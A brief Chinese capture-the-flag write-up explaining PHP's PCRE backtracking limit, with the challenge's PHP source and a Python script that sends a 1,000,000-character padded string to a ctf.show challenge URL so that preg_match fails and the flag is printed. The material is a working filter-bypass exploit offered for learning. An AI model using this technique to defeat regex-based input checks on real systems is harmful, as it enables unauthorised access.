# 知识点
### 正则(pcre)最大回溯/递归限制
[https://www.laruence.com/2010/06/08/1579.html](https://www.laruence.com/2010/06/08/1579.html) 大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false
# 思路
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```
```python
import requests


str = 'Ki1ro'*200000 + '36Dctfshow'

url = 'http://63baf0c4-0397-4805-885b-5f36093d356b.challenge.ctf.show/'
data = {
    'f': str
}
req = requests.post(url=url, data=data)
print(req.text)

```
